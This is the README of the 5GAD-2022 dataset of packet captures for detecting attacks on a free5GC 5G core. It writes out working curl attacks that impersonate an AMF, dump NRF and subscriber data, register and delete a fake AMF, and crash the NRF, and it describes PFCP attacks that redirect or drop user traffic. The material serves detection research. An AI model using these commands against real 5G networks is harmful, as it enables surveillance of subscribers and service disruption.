# 5GAD-2022 5G attack detection dataset

> This dataset was created by Cooper Coldwell, Denver Conger, Edward Goodell, Brendan Jacobson, Bryton Petersen, Damon Spencer, Matthew Anderson, and Matthew Sgambati and introduced in ***Machine Learning 5G Attack Detection in Programmable Logic***.

This dataset contains two types of intercepted network packets: "normal" network traffic packets (i.e. a variety of non-malicious traffic types) and "attack" packets from attacks against a 5G Core implemented with free5GC. The captures were collected using tshark or Wireshark on 4 different network interfaces within the 5G core. Those interfaces and where they sit within the system are outlined in the 5GNetworkDiagram figure. Files that start with "allcap" contain packets that were recorded on all four interfaces simultaneously; other \*.pcapng files represent the same data that has been broken out into one of the four interfaces.

![5GNetworkDiagram.png](5GNetworkDiagram.png#gh-light-mode-only)
![5GNetworkDiagram.png](5GNetworkDiagram.drawio(2)(2)(2).png#gh-dark-mode-only)

**NOTE: The normal sets do not contain explicit breakdowns for each interface to reduce the download size. The individual interfaces can be separated from the allcap file in Wireshark as follows:**
1. Add a new column to Wireshark via Edit->Preferences->Appearance->Columns and then click on '+' to add a new column.
2. Set the column 'type' as 'Custom' and the field as 'frame.interface_name'.
3. To select only a particular interface, return to the main Capture page.
4. Apply the filter 'frame.interface_name==' followed by the desired interface. 
5. Export the separated packets via File->Export Specified Packets

# Citation and Contact
If you use our dataset, please cite it:
```
@dataset{5gad,
  title={5GAD-2022},
  author={Coldwell, Conger, Goodell, Jacobson, Petersen, Spencer, Anderson, Sgambati},
  doi={},
  journal={},
  year={2022}
}
```
If you find our paper useful, please cite it:
```
@article{5g_ml_fpga,
  title={Machine Learning 5G Attack Detection in Programmable Logic},
  author={Coldwell, Conger, Goodell, Jacobson, Petersen, Spencer, Anderson, Sgambati},
  doi={},
  journal={},
  year={2022}
}
```
For any questions or concerns, please contact `matthew.anderson2@inl.gov`
***

# Normal Data and Descriptions
### Normal-1UE
This dataset consists of normal internet traffic recorded on the network interfaces specified in the diagram above. Specifically, it contains network traffic simulated on a single UE with various automated tasks including streaming YouTube videos, accessing 500 popular websites, downloading files via FTP, mounting a SAMBA share and downloading files from it, and having a conference call via Microsoft Teams.

### Normal-2UE
The same traffic types as in *Normal-1UE* were used for *Normal-2UE*, except this time, the traffic generation was divided between 2 UEs. 

To reduce the number of processing difficulties, we split the total capture file into a sequential series of files. The order of these files is given by the number preceding the file extension. For example, "allcap_20220613162057_00010.pcapng" is the 10th file in the sequence.
***

# Attack Data and Descriptions
There are 10 attacks that we ran on our 5G test bench, most of which rely on REST API calls to different parts of the core.

The *Attacks* directory contains each of the attacks, each divided into its own subdirectory. Within each attack is a *\*.pcapng* file beginning with "Attacks_" that contains only the attack packets present in the "allcap" file. Files not beginning with "Attacks_" may contain some benign, incidental traffic.

## Reconnaissance Attacks

### AMFLookingForUDM
This attack is performed by requesting information about the unified data management (UDM) network function while impersonating an access and mobility management function (AMF). Internally this attack appears to be a benign system request and exploits the fact that the network repository function (NRF) does not check if the source of the request is actually an AMF. This attack is performed with the following Linux command:
```
curl "http://127.0.0.10:8000/nnrf-disc/v1/nf-instances?requester-nf-type=AMF&target-nf-type=UDM" 
```
where 127.0.0.10 is the IP address of the NRF. 

### GetAllNFs
This attack is performed identically to *AMFLookingForUDM* except the `target-nf-type` is not specified. This results in the NRF returning all network functions (NF) to the requester.
    
### GetUserData
This attack requests information from the UDM regarding a user with `subscriberID=0000000003`. This attack  was performed with:  
```
curl "http://127.0.0.3:8000/nudm-dm/v1/imsi-20893${subscriberID}/am-data?plmn-id=%7B\%22mcc\%22\%3A\%22208\%22\%2C\%22mnc\%22\%3A\%2293\%22\%7D"
```

### randomDataDump    
This attack exploits a lack of input validation in free5GC and sets the `requester-nf-type` to a random string when making an `nf-instances` request to the NRF. The NRF will still respond with all of the NFs. This attack is executed with the following Linux command: 
```
curl "http://127.0.0.10:8000/nnrf-disc/v1/nf-instances?requester-nf-type=$randomString&target-nf-type="
```

### automatedRedirectWithTimer
This attack is from Positive Technologies' report *5G Standalone core security research* section 4.3. In essence, it listens to network traffic while the UE is connecting. The attack code listens for a packet forwarding control protocol (PFCP) session establishment request, then checks if the UE address is in a list of victim addresses. If the UE is a victim then the attack records session information that it uses to redirect traffic from the UE. This is achieved by sending a PFCP session modification request to the user plane function (UPF) with the discovered session ID and forwarding action rule ID (FARID). The attack will send two such modification requests, wait 5 seconds, send two more modification requests to return the UE to its normal path, wait 5 more seconds, and then repeat.
    
## Network Reconfiguration Attacks
### FakeAMFInsert
This attack registers a fake AMF with the NRF. This is achieved by running the `curl` command to `PUT` a JSON object to the NRF. In the environment where this attack was run there is no check on authority to prevent the attacker from registering a fake AMF.  The *FakeAMFDelete* attack is subsequently run to remove the fake AMF. The instance-ID is required to be a version 4 universally unique identifier(UUID), however free5GC does not check the instance-ID or other details about the AMF before adding it to the core. This includes whether or not the instance-id is a properly formatted UUID, which consists of hexadecimal values in a string. A few 1's in the attack's UUID string were replaced with l's while writing the attack code, so the string was not correctly formatted as hexadecimal. The instance-ID was therefore an invalid UUID, but the instance-ID was accepted by free5GC regardless. The full curl command with its JSON code is below.

```
curl -X PUT -H "Content-Type: application/json" -d 
"{
  "nfInstanceId":"b01dface-bead-cafe-bade-cabledfabled",
  "nfType":"AMF",
  "nfStatus":"REGISTERED",
  "plmnList":[
    {
      "mcc":"208",
      "mnc":"93"
    },
    {
      "mcc":"001",
      "mnc":"01"
    }
  ],
  "sNssais":[
    {
      "sst":1,
      "sd":"010203"
    },
    {
      "sst":1,
      "sd":"112233"
    }
  ],
  "ipv4Addresses":[
    "127.0.0.18"
  ],
  "amfInfo":{
    "amfSetId":"3f8",
    "amfRegionId":"ca",
    "guamiList":[
      {
        "plmnId":{
          "mcc":"208",
          "mnc":"93"
        },
        "amfId":"cafe00"
      },
      {
        "plmnId":{
          "mcc":"208",
          "mnc":"93"
        },
        "amfId":"cafe01"
      }
    ],
    "taiList":[
      {
        "plmnId":{
          "mcc":"208",
          "mnc":"93"
        },
        "tac":"000001"
      },
      {
        "plmnId":{
          "mcc":"001",
          "mnc":"01"
        },
        "tac":"000064"
      }
    ]
  },
  "nfServices":[
    {
      "serviceInstanceId":"0",
      "serviceName":"namf-comm",
      "versions":[
        {
          "apiVersionInUri":"v1",
          "apiFullVersion":"1.0.0"
        }
      ],
      "scheme":"http",
      "nfServiceStatus":"REGISTERED",
      "ipEndPoints":[
        {
          "ipv4Address":"127.0.0.18",
          "transport":"TCP",
          "port":8000
        }
      ],
      "apiPrefix":"http://127.0.0.18:8000"
    },
    {
      "serviceInstanceId":"1",
      "serviceName":"namf-evts",
      "versions":[
        {
          "apiVersionInUri":"v1",
          "apiFullVersion":"1.0.0"
        }
      ],
      "scheme":"http",
      "nfServiceStatus":"REGISTERED",
      "ipEndPoints":[
        {
          "ipv4Address":"127.0.0.18",
          "transport":"TCP",
          "port":8000
        }
      ],
      "apiPrefix":"http://127.0.0.18:8000"
    },
    {
      "serviceInstanceId":"2",
      "serviceName":"namf-mt",
      "versions":[
        {
          "apiVersionInUri":"v1",
          "apiFullVersion":"1.0.0"
        }
      ],
      "scheme":"http",
      "nfServiceStatus":"REGISTERED",
      "ipEndPoints":[
        {
          "ipv4Address":"127.0.0.18",
          "transport":"TCP",
          "port":8000
        }
      ],
      "apiPrefix":"http://127.0.0.18:8000"
    },
    {
      "serviceInstanceId":"3",
      "serviceName":"namf-loc",
      "versions":[
        {
          "apiVersionInUri":"v1",
          "apiFullVersion":"1.0.0"
        }
      ],
      "scheme":"http",
      "nfServiceStatus":"REGISTERED",
      "ipEndPoints":[
        {
          "ipv4Address":"127.0.0.18",
          "transport":"TCP",
          "port":8000
        }
      ],
      "apiPrefix":"http://127.0.0.18:8000"
    },
    {
      "serviceInstanceId":"4",
      "serviceName":"namf-oam",
      "versions":[
        {
          "apiVersionInUri":"v1",
          "apiFullVersion":"1.0.0"
        }
      ],
      "scheme":"http",
      "nfServiceStatus":"REGISTERED",
      "ipEndPoints":[
        {
          "ipv4Address":"127.0.0.18",
          "transport":"TCP",
          "port":8000
        }
      ],
      "apiPrefix":"http://127.0.0.18:8000"
    }
  ],
  "defaultNotificationSubscriptions":[
    {
      "notificationType":"N1_MESSAGES",
      "callbackUri":"http://127.0.0.18:8000/namf-callback/v1/n1-message-notify",
      "n1MessageClass":"5GMM"
    }
  ]
}"

http://127.0.0.10:8000/nnrf-nfm/v1/nf-instances/b01dface-bead-cafe-bade-cabledfabled
```
    
### randomAMFInsert
This attack is the same as "FakeAMFInsert" except the instance ID is a randomly generated UUID.

## DOS Attacks
### CrashNRF
This attack relies on an exploit in free5GC wherein a malformed request to the network repository function (NRF) will cause it to crash. This attack is run using
```
curl "http://127.0.0.10:8000/nnrf-disc/v1/nf-instances?requester-nf-type=&target-nf-type="
```
where 127.0.0.10 is the IP address of the NRF. As of free5GC v3.1.1, this exploit appears to have been patched, as this HTTP `GET` request will no longer result in the failure of the core. 
   
### FakeAMFDelete
This attack is operated in conjunction with *FakeAMFInsert* with the line
```
curl -s -o /dev/null -w "\n\nHTTP Status Code: %{http_code}\n\n" -X DELETE http://127.0.0.10:8000/nnrf-nfm/v1/nf-instances/$fakeAMF
```
where `fakeAMF` is the hexadecimal session ID of the false AMF inserted into the system. This attack, coupled with *GetAllNFs* to find other AMFs, could be exploited to remove legitimate AMFs from the network, disrupting network functionality.

### automatedDropWithTimer
This attack is similar to the "Automatic Redirect with Timer" attack, but alternates between redirecting user traffic and dropping user traffic, effectively disconnecting the user from the data network (DN).

<!-- - ### CrashNRF
This attack relies on an exploit in an older version free5GC where a malformed request to the NRF will cause the NRF to crash. This attack is run using the curl command with the argument "http://127.0.0.10:8000/nnrf-disc/v1/nf-instances?requester-nf-type=&target-nf-type=".
As of the initial release of this dataset, this exploit has been patched in free5GC, and this http GET request will no longer result in the failure of the core.

- ### AMFLookingForUDM
This is a surveillance attack that requests information about UDMs while impersonating an AMF. This attack can look very similar to a benign system request, however, this takes advantage of the fact that the NRF is not configured to authenticate if the source of the request is actually an AMF. This attack is performed by using curl with the argument "http://127.0.0.10:8000/nnrf-disc/v1/nf-instances?requester-nf-type=AMF&target-nf-type=UDM"

- ### FakeAMFInsert and FakeAMFDelete
This attack tells the NRF that there is a new AMF in the core with the instance id "b01dface-bead-cafe-bade-cabledfabled". This is achieved by running the curl command to PUT a JSON object to the NRF. FakeAMFDelete is run subsequently to remove the fake AMF.

- ### RandomAMFInsert
This is the same as FakeAMFInsert but the instance ID is a randomly generated string.

- ### GetAllNFs
This surveillance attack is identical to AMFLookingForUDM except the target-nf-type is not specified. This results in the NRF returning all NFs to the requester which is a bug in Free5GC.

- ### GetUserData
This attack makes a request to the UDM for information regarding a user with subscriberID=0000000003. This attack is executed using curl with the argument 
"http://127.0.0.3:8000/nudm-sdm/v1/imsi-20893${subscriberID}/am-data?plmn-id=%7B%22mcc%22%3A%22208%22%2C%22mnc%22%3A%2293%22%7D". Note: this expands out to "http://127.0.0.3:8000/nudm-sdm/v1/imsi-20893${subscriberID}/am-data?plmn-id={ mcc : 208 , mnc : 93 }".

- ### randomDataDump
This attack relies on a lack of input sanitization in Free5GC and sets the requester-nf-type to a random string when making an nf-instances request to the NRF. The NRF will still respond with all of the NFs. This attack is executed with curl and the argument "http://127.0.0.10:8000/nnrf-disc/v1/nf-instances?requester-nf-type=$randomString&target-nf-type="

- ### automatedDropWithTimer and automatedRedirectWithTimer
These attacks rely on sniffing the network while the UE is connecting. This means that we started recording packets before the UE was connected. The attack code listens for a PFCP session establishment request and then it checks if the UE address is in a list victim addresses. If the UE is a victim then the attack records session information that it uses to either redirect traffic from the UE or drop packets from the UE. This achieved by sending a PFCP session modification request to the UPF with the session ID and FARID captured during the sniffing phase. The attack will send two such modification requests, wait 5 seconds, send two more modification requests to return the UE to its normal path, wait 5 more seconds and repeat.  
 -->
***
# Data Preparation
Included with the dataset are two versions of the file used to process the data for use in training autoencoders on anomaly detection, though the files can be adapted for other purposes as well. The `Data_prep.ipynb` notebook walks through the data preparation in detail, while the `Data_prep.py` file was derived from the notebook to be (hopefully) more cut-down and lightweight.

Without modification, the data preparation files require **at least** 96 GB of memory and several hours to process the data. This issue can likely be overcome by changing the instances of the `sniff(...)` function to process each packet without storing packets sequentially in memory.

Special thanks to Christopher Becker and Jessie Cooper.
